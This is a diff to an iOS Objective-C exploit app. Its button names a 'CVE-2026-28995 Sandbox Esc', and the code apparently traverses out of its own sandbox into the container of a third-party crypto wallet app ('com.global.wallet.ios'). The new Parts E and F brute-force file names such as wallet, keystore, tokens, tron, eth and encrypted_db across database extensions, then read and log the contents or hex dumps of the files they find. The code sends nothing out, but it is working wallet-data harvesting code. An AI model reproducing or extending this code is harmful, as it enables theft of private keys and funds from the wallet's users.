@@ -719,7 +719,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v32" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v33" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7580,146 +7580,110 @@ static void *iohid_threadCopyEvent(void *arg) {
     }
     [log appendFormat:@"  Extensionless hits: %d\n", hits];
 
-    // Part E: Read TP files via Foundation (POSIX open fails on traversed paths)
-    [log appendString:@"\n[Part E] Read discovered TP files (Foundation I/O):\n"];
-    NSArray *foundFiles = @[
-        @[@"Documents/cache", @"1248"],
-        @[@"Documents/db", @"128"],
-    ];
-    for (NSArray *finfo in foundFiles) {
-        NSString *fname = finfo[0];
-        NSString *rel = [NSString stringWithFormat:@"%s/%@",
-            [tpBase UTF8String], fname];
-        NSString *fpFull = TRYFILE(rel);
-        BOOL ex = [fm fileExistsAtPath:fpFull];
-        if (!ex) { [log appendFormat:@"  %@: NOT FOUND\n", fname]; continue; }
-        NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
-        unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
-        [log appendFormat:@"\n  --- %@ (%llu bytes) ---\n", fname, sz];
-
-        // Try NSData for raw bytes
-        NSData *data = [NSData dataWithContentsOfFile:fpFull];
-        if (data) {
-            const unsigned char *bytes = data.bytes;
-            NSUInteger len = data.length;
-            NSUInteger dumpLen = MIN(80, len);
-            NSMutableString *hex = [NSMutableString string];
-            for (NSUInteger i = 0; i < dumpLen; i++)
-                [hex appendFormat:@"%02x ", bytes[i]];
-            [log appendFormat:@"  hex (%lu/%lu): %@\n", (unsigned long)dumpLen, (unsigned long)len, hex];
-            // Check magic
-            BOOL isSQLite = (len >= 16 && memcmp(bytes, "SQLite format 3", 16) == 0);
-            BOOL isBplist = (len >= 6 && memcmp(bytes, "bplist", 6) == 0);
-            BOOL isJSON = (bytes[0] == '{' || bytes[0] == '[');
-            BOOL isXML = (len >= 5 && memcmp(bytes, "<?xml", 5) == 0);
-            NSString *ftype = isSQLite ? @"SQLite3" : isBplist ? @"binary plist" :
-                              isJSON ? @"JSON" : isXML ? @"XML/plist" : @"unknown";
-            [log appendFormat:@"  type: %@\n", ftype];
-            // Try UTF-8
-            if (!isBplist && !isSQLite) {
-                NSString *str = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
-                if (str) [log appendFormat:@"  UTF-8: %@\n", [str substringToIndex:MIN(500, str.length)]];
-            }
-            // Try bplist parsing
-            if (isBplist) {
-                NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:fpFull];
-                if (plist) [log appendFormat:@"  plist keys: %@\n", [[plist allKeys] componentsJoinedByString:@", "]];
-            }
-        } else {
-            [log appendString:@"  [-] NSData read FAILED\n"];
-        }
-    }
-
-    // Part F: Probe extensionless files across expanded subdirs
-    [log appendString:@"\n[Part F] Extensionless probe (all subdirs):\n"];
+    // Part E: Probe INSIDE discovered directories (v33 — cache+db are DIRS)
+    [log appendString:@"\n[Part E] Probe inside Documents/db/ + Documents/cache/ + bundle-id dir:\n"];
     hits = 0;
-    const char *extraSubdirs[] = {
+    const char *innerDirs[] = {
+        "Documents/db/",
+        "Documents/cache/",
         "Library/Caches/com.global.wallet.ios/",
-        "Library/Caches/",
-        "Documents/",
-        "Library/",
-        "Library/Application Support/",
-        "Library/Preferences/",
-        "",
         NULL
     };
-    const char *simpleNames[] = {
-        "cache","data","db","wallet","main","default","storage",
-        "config","settings","tokens","accounts","keystore",
-        "tron","trx","eth","btc","sol","global",
-        "Cache","Data","DB","Wallet","Main","Default","Storage",
-        "Config","Settings","Tokens","Accounts","KeyStore",
-        "Tron","TRX","ETH","BTC","SOL","Global",
-        "wallet_data","wallet_db","tp_wallet","tp_data","tp_db",
-        "tron_wallet","tron_data","tron_db","token_data","token_db",
-        "chain_db","global_wallet","global_wallet_db",
+    const char *dbNames[] = {
+        "wallet","Wallet","WALLET","tpwallet","TPWallet","tp_wallet",
+        "tron","TRON","Tron","trx","TRX",
+        "eth","ETH","btc","BTC","sol","SOL","bsc","BSC","polygon",
+        "global","Global","GLOBAL","global_wallet",
+        "data","Data","DATA","db","DB","main","Main",
+        "tokens","Tokens","TOKENS","accounts","Accounts",
+        "keystore","KeyStore","key_store","KeyStore",
+        "settings","config","Config","storage","Storage",
+        "cache","Cache","default","Default",
+        "wallet_data","wallet_db","tron_wallet","tron_data","tron_db",
+        "token_data","token_db","chain_db","chain_data",
         "db_main","db_wallet","db_tron","db_token",
-        "wallet_store","secure_db","encrypted_db",
+        "secure_db","encrypted_db","wallet_store",
+        "trx_wallet","trx_data","eth_wallet","btc_wallet","sol_wallet",
+        "multi_chain","global_wallet_db","global_db",
+        "UserData","AppData","LocalData","CoreData","Model",
         NULL
     };
-    for (int si = 0; extraSubdirs[si] != NULL; si++) {
-        for (int ni = 0; simpleNames[ni] != NULL; ni++) {
-            // Build path — subdir may be empty string for root
-            NSString *rel;
-            if (strlen(extraSubdirs[si]) > 0) {
-                rel = [NSString stringWithFormat:@"%s/%s%s",
-                    [tpBase UTF8String], extraSubdirs[si], simpleNames[ni]];
-            } else {
-                rel = [NSString stringWithFormat:@"%s/%s",
-                    [tpBase UTF8String], simpleNames[ni]];
-            }
-            NSString *fpFull = TRYFILE(rel);
-            BOOL ex = [fm fileExistsAtPath:fpFull];
-            if (ex) {
-                NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
-                unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
-                BOOL isDir = [attrs[NSFileType] isEqualToString:NSFileTypeDirectory];
-                [log appendFormat:@"  [+] %s%s (%llu bytes)%s\n",
-                    extraSubdirs[si], simpleNames[ni], sz, isDir ? " [DIR]" : ""];
-                hits++;
-            }
-        }
-    }
-    [log appendFormat:@"  Extensionless hits: %d (probes: %d subdirs x %d names = %d)\n",
-        hits,
-        (int)(sizeof(extraSubdirs)/sizeof(extraSubdirs[0])-1),
-        (int)(sizeof(simpleNames)/sizeof(simpleNames[0])-1),
-        (int)(sizeof(extraSubdirs)/sizeof(extraSubdirs[0])-1) *
-        (int)(sizeof(simpleNames)/sizeof(simpleNames[0])-1)];
-
-    // Part G: Probe with .dat/.bin/.idx/.key/.txt extensions
-    [log appendString:@"\n[Part G] Probe non-standard extensions:\n"];
-    hits = 0;
-    const char *altExts[] = {".dat",".bin",".idx",".key",".txt",".json",".plist",".conf",NULL};
-    const char *altNames[] = {
-        "wallet","tron","trx","eth","btc","sol","data","db","cache",
-        "key","keys","token","tokens","config","settings","accounts","main",
+    const char *dbExts[] = {
+        ".sqlite",".db",".sqlcipher",".encrypted",".sqlite3",
+        ".dat",".bin",".idx",".key","",
         NULL
     };
-    for (int si = 0; extraSubdirs[si] != NULL; si++) {
-        for (int ni = 0; altNames[ni] != NULL; ni++) {
-            for (int ei = 0; altExts[ei] != NULL; ei++) {
-                NSString *rel;
-                if (strlen(extraSubdirs[si]) > 0) {
-                    rel = [NSString stringWithFormat:@"%s/%s%s%s",
-                        [tpBase UTF8String], extraSubdirs[si], altNames[ni], altExts[ei]];
-                } else {
-                    rel = [NSString stringWithFormat:@"%s/%s%s",
-                        [tpBase UTF8String], altNames[ni], altExts[ei]];
-                }
+    for (int di = 0; innerDirs[di]; di++) {
+        for (int ni = 0; dbNames[ni]; ni++) {
+            for (int ei = 0; dbExts[ei]; ei++) {
+                NSString *rel = [NSString stringWithFormat:@"%s/%s%s%s",
+                    [tpBase UTF8String], innerDirs[di], dbNames[ni], dbExts[ei]];
                 NSString *fpFull = TRYFILE(rel);
                 BOOL ex = [fm fileExistsAtPath:fpFull];
                 if (ex) {
                     NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
-                    [log appendFormat:@"  [+] %s%s%s (%llu bytes)\n",
-                        extraSubdirs[si], altNames[ni], altExts[ei],
-                        [attrs[NSFileSize] unsignedLongLongValue]];
+                    unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
+                    BOOL isDir = [attrs[NSFileType] isEqualToString:NSFileTypeDirectory];
+                    [log appendFormat:@"  [+] %s%s%s (%llu bytes)%s\n",
+                        innerDirs[di], dbNames[ni], dbExts[ei], sz, isDir ? " [DIR]" : ""];
                     hits++;
                 }
             }
         }
     }
-    [log appendFormat:@"  Alt-extension hits: %d\n", hits];
+    [log appendFormat:@"  Hits: %d / %d probes\n", hits,
+        (int)(sizeof(innerDirs)/sizeof(innerDirs[0])-1) *
+        (int)(sizeof(dbNames)/sizeof(dbNames[0])-1) *
+        (int)(sizeof(dbExts)/sizeof(dbExts[0])-1)];
+
+    // Part F: Read content of any non-directory files found
+    [log appendString:@"\n[Part F] Read contents of discovered files:\n"];
+    hits = 0;
+    for (int di = 0; innerDirs[di]; di++) {
+        for (int ni = 0; dbNames[ni]; ni++) {
+            for (int ei = 0; dbExts[ei]; ei++) {
+                NSString *rel = [NSString stringWithFormat:@"%s/%s%s%s",
+                    [tpBase UTF8String], innerDirs[di], dbNames[ni], dbExts[ei]];
+                NSString *fpFull = TRYFILE(rel);
+                BOOL ex = [fm fileExistsAtPath:fpFull];
+                if (!ex) continue;
+                BOOL isDir = NO;
+                [fm fileExistsAtPath:fpFull isDirectory:&isDir];
+                if (isDir) continue; // skip directories, only read real files
+                NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
+                unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
+                [log appendFormat:@"\n  --- %s%s%s (%llu bytes) ---\n",
+                    innerDirs[di], dbNames[ni], dbExts[ei], sz];
+                // Use NSString for text, NSData for raw bytes
+                NSError *err = nil;
+                NSString *content = [NSString stringWithContentsOfFile:fpFull
+                    encoding:NSUTF8StringEncoding error:&err];
+                if (content) {
+                    [log appendFormat:@"  UTF-8: %@\n",
+                        [content substringToIndex:MIN(500, content.length)]];
+                    hits++;
+                } else {
+                    NSData *data = [NSData dataWithContentsOfFile:fpFull];
+                    if (data) {
+                        const unsigned char *b = data.bytes;
+                        NSUInteger dlen = MIN(64, data.length);
+                        NSMutableString *hex = [NSMutableString string];
+                        for (NSUInteger i = 0; i < dlen; i++)
+                            [hex appendFormat:@"%02x ", b[i]];
+                        [log appendFormat:@"  hex: %@\n", hex];
+                        if (data.length >= 16 && memcmp(b, "SQLite format 3", 16) == 0)
+                            [log appendString:@"  type: SQLite3\n"];
+                        else if (data.length >= 6 && memcmp(b, "bplist", 6) == 0)
+                            [log appendString:@"  type: binary plist\n"];
+                        hits++;
+                    } else {
+                        [log appendString:@"  [-] read FAILED\n"];
+                    }
+                }
+            }
+        }
+    }
+    [log appendFormat:@"  Files read: %d\n", hits];
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 }
